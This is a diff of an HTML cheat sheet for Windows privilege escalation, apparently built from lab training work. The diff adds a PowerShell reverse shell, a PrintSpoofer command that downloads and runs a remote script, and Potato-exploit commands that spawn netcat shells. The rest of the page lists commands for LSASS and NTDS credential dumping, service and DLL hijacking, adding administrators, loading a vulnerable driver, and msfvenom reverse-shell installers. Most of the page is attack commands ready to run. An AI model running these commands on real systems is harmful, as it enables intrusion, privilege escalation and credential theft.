@@ -318,7 +318,46 @@ sc start ServiceName</code></pre>
                 If enabled:
 
                 <pre><code>PrintSpoofer64.exe -i -c cmd
-GodPotato.exe -cmd cmd</code></pre>
+GodPotato.exe -cmd cmd
+</code></pre>
+
+                <h2>Print spoofer Example</h2>
+                <pre><code>
+    $client = New-Object System.Net.Sockets.TCPClient('192.168.45.192',4443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+
+while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
+    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $output = (iex $data 2>&1 | Out-String);
+
+    $output += "PS " + (pwd).Path + "> ";
+    $send = ([text.encoding]::ASCII).GetBytes($output);
+
+    $stream.Write($send,0,$send.Length);
+    $stream.Flush()
+}
+$client.Close()
+
+</code></pre>
+
+                <pre><code>
+.\PrintSpoofer64.exe -i -c "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.192:8000/shell.ps1')"
+</code></pre>
+
+                <h2>JuicyPotato example</h2>
+                <pre><code>
+juicy86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\nc.exe -e cmd.exe 192.168.45.157 242" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+</code></pre>
+                <p>Search CLSID</p>
+                https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
+
+                <h2>GodPotato</h2>
+
+                <pre><code>
+.\GodPotato-NET4.exe -cmd ".\nc64.exe 192.168.45.154 80  -e c:\windows\system32\cmd.exe"</code></pre>
+
+
 
                 Gain SYSTEM via token impersonation.
 
@@ -462,11 +501,11 @@ Seatbelt.exe</code></pre>
 
 
         <div class="section">
-    <div class="section-header">Windows Privilege Escalation – COMPLETE CHEATSHEET</div>
-    <div class="section-content">
+            <div class="section-header">Windows Privilege Escalation – COMPLETE CHEATSHEET</div>
+            <div class="section-content">
 
-        <h2>Initial Enumeration</h2>
-        <pre><code>xfreerdp /v:&lt;target ip&gt; /u:htb-student
+                <h2>Initial Enumeration</h2>
+                <pre><code>xfreerdp /v:&lt;target ip&gt; /u:htb-student
 
 ipconfig /all
 arp -a
@@ -483,8 +522,8 @@ systeminfo
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 wmic product get name</code></pre>
 
-        <h2>Privilege Enumeration</h2>
-        <pre><code>tasklist /svc
+                <h2>Privilege Enumeration</h2>
+                <pre><code>tasklist /svc
 query user
 echo %USERNAME%
 
@@ -502,47 +541,47 @@ pipelist.exe /accepteula
 gci \\.\pipe\
 accesschk.exe /accepteula \\.\Pipe\lsass -v</code></pre>
 
-        <h2>RDP / MSSQL / Execution</h2>
-        <pre><code>mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+                <h2>RDP / MSSQL / Execution</h2>
+                <pre><code>mssqlclient.py sql_dev@10.129.43.30 -windows-auth
 
 enable_xp_cmdshell
 xp_cmdshell whoami</code></pre>
 
-        <h2>Privilege Escalation Tools</h2>
-        <pre><code>JuicyPotato.exe -l 53375 -p cmd.exe -a "/c nc.exe 10.10.14.3 443 -e cmd.exe" -t *
+                <h2>Privilege Escalation Tools</h2>
+                <pre><code>JuicyPotato.exe -l 53375 -p cmd.exe -a "/c nc.exe 10.10.14.3 443 -e cmd.exe" -t *
 
 PrintSpoofer.exe -c "nc.exe 10.10.14.3 8443 -e cmd"
 
 msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll</code></pre>
 
-        <h2>Memory / Credential Dumping</h2>
-        <pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+                <h2>Memory / Credential Dumping</h2>
+                <pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords</code></pre>
 
-        <h2>File Permissions Abuse</h2>
-        <pre><code>dir /q C:\backups\wwwroot\web.config
+                <h2>File Permissions Abuse</h2>
+                <pre><code>dir /q C:\backups\wwwroot\web.config
 takeown /f C:\backups\wwwroot\web.config
 
 icacls "C:\backups\wwwroot\web.config" /grant htb-student:F
 
 Get-ChildItem -Path 'C:\backups\wwwroot\web.config' | select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}</code></pre>
 
-        <h2>NTDS / Hash Dumping</h2>
-        <pre><code>secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+                <h2>NTDS / Hash Dumping</h2>
+                <pre><code>secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 
 robocopy /B E:\Windows\NTDS .\ntds ntds.dit</code></pre>
 
-        <h2>Event Log Enumeration</h2>
-        <pre><code>wevtutil qe Security /rd:true /f:text | Select-String "/user"
+                <h2>Event Log Enumeration</h2>
+                <pre><code>wevtutil qe Security /rd:true /f:text | Select-String "/user"
 
 wevtutil qe Security /rd:true /f:text /r:share01 /u:user /p:pass | findstr "/user"
 
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 }</code></pre>
 
-        <h2>DNS / Registry / Domain Abuse</h2>
-        <pre><code>dnscmd.exe /config /serverlevelplugindll adduser.dll
+                <h2>DNS / Registry / Domain Abuse</h2>
+                <pre><code>dnscmd.exe /config /serverlevelplugindll adduser.dll
 
 sc stop dns
 sc start dns
@@ -551,16 +590,16 @@ reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
 
 reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll</code></pre>
 
-        <h2>Driver / Kernel Abuse</h2>
-        <pre><code>reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+                <h2>Driver / Kernel Abuse</h2>
+                <pre><code>reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
 reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 
 EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 
 DriverView.exe /stext drivers.txt</code></pre>
 
-        <h2>Service Abuse</h2>
-        <pre><code>sc query dns
+                <h2>Service Abuse</h2>
+                <pre><code>sc query dns
 sc config AppReadiness binPath= "cmd /c net localgroup Administrators user /add"
 
 sc.exe sdshow DNS
@@ -569,37 +608,37 @@ sc start dns
 
 Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Service -Name ImagePath -Value "cmd.exe"</code></pre>
 
-        <h2>Registry / UAC Checks</h2>
-        <pre><code>REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+                <h2>Registry / UAC Checks</h2>
+                <pre><code>REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
 REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
 
 [environment]::OSVersion.Version
 cmd /c echo %PATH%</code></pre>
 
-        <h2>DLL / Rundll32 Abuse</h2>
-        <pre><code>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
+                <h2>DLL / Rundll32 Abuse</h2>
+                <pre><code>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
 
 rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll</code></pre>
 
-        <h2>Service / Binary Replacement</h2>
-        <pre><code>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+                <h2>Service / Binary Replacement</h2>
+                <pre><code>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
 
 cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
 
-        <h2>Scheduled Tasks</h2>
-        <pre><code>schtasks /query /fo LIST /v
+                <h2>Scheduled Tasks</h2>
+                <pre><code>schtasks /query /fo LIST /v
 Get-ScheduledTask
 
 .\accesschk64.exe /accepteula -s -d C:\Scripts\</code></pre>
 
-        <h2>Startup / Process Enumeration</h2>
-        <pre><code>Get-CimInstance Win32_StartupCommand | select Name,command,Location,User | fl
+                <h2>Startup / Process Enumeration</h2>
+                <pre><code>Get-CimInstance Win32_StartupCommand | select Name,command,Location,User | fl
 
 get-process -Id 3324
 get-service | ? {$_.DisplayName -like 'Druva*'}</code></pre>
 
-        <h2>Credential Theft</h2>
-        <pre><code>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+                <h2>Credential Theft</h2>
+                <pre><code>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
 
 cmdkey /list
 
@@ -611,35 +650,35 @@ Import-Clixml C:\scripts\pass.xml
 netsh wlan show profile
 netsh wlan show profile NAME key=clear</code></pre>
 
-        <h2>File Transfer / Certutil</h2>
-        <pre><code>certutil.exe -urlcache -split -f http://10.10.14.3/file shell.bat
+                <h2>File Transfer / Certutil</h2>
+                <pre><code>certutil.exe -urlcache -split -f http://10.10.14.3/file shell.bat
 
 certutil -encode file1 encodedfile
 certutil -decode encodedfile file2</code></pre>
 
-        <h2>MSI / Persistence</h2>
-        <pre><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+                <h2>MSI / Persistence</h2>
+                <pre><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
 
 msiexec /i aie.msi /quiet /qn /norestart</code></pre>
 
-        <h2>Advanced Tools</h2>
-        <pre><code>winPEAS.exe
+                <h2>Advanced Tools</h2>
+                <pre><code>winPEAS.exe
 Seatbelt.exe
 PowerUp.ps1
 SharpUp.exe
 LaZagne.exe
 Invoke-SessionGopher</code></pre>
 
-        <h2>VHD / VMDK Mounting</h2>
-        <pre><code>guestmount -a disk.vmdk -i --ro /mnt/vmdk
+                <h2>VHD / VMDK Mounting</h2>
+                <pre><code>guestmount -a disk.vmdk -i --ro /mnt/vmdk
 guestmount --add disk.vhdx --ro /mnt/vhdx -m /dev/sda1</code></pre>
 
-        <h2>Exploit Suggester</h2>
-        <pre><code>python windows-exploit-suggester.py --update
+                <h2>Exploit Suggester</h2>
+                <pre><code>python windows-exploit-suggester.py --update
 python windows-exploit-suggester.py --database file.xls --systeminfo sysinfo.txt</code></pre>
 
-    </div>
-</div>
+            </div>
+        </div>
 
     </div>
 
@@ -708,37 +747,37 @@ python windows-exploit-suggester.py --database file.xls --systeminfo sysinfo.txt
             resultsContainer.classList.remove("collapsed");
         }
         document.querySelectorAll(".sub-title").forEach(title => {
-                        const wrapper = document.createElement("div");
-                        wrapper.classList.add("sub-wrapper");
+            const wrapper = document.createElement("div");
+            wrapper.classList.add("sub-wrapper");
 
-                        const content = document.createElement("div");
-                        content.classList.add("sub-content");
+            const content = document.createElement("div");
+            content.classList.add("sub-content");
 
-                        // meter wrapper en el DOM justo antes del título
-                        title.parentNode.insertBefore(wrapper, title);
+            // meter wrapper en el DOM justo antes del título
+            title.parentNode.insertBefore(wrapper, title);
 
-                        // mover el título dentro del wrapper
-                        wrapper.appendChild(title);
+            // mover el título dentro del wrapper
+            wrapper.appendChild(title);
 
-                        // mover todo hasta el siguiente sub-title o section-header
-                        let next = wrapper.nextSibling;
+            // mover todo hasta el siguiente sub-title o section-header
+            let next = wrapper.nextSibling;
 
-                        while (
-                                next &&
-                                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
-                        ) {
-                                const temp = next.nextSibling;
-                                content.appendChild(next);
-                                next = temp;
-                        }
+            while (
+                next &&
+                !(next.classList && (next.classList.contains("sub-title") || next.classList.contains("section-header")))
+            ) {
+                const temp = next.nextSibling;
+                content.appendChild(next);
+                next = temp;
+            }
 
-                        wrapper.appendChild(content);
+            wrapper.appendChild(content);
 
-                        // toggle
-                        title.addEventListener("click", () => {
-                                wrapper.classList.toggle("active");
-                        });
-                });
+            // toggle
+            title.addEventListener("click", () => {
+                wrapper.classList.toggle("active");
+            });
+        });
     </script>
 
 </body>
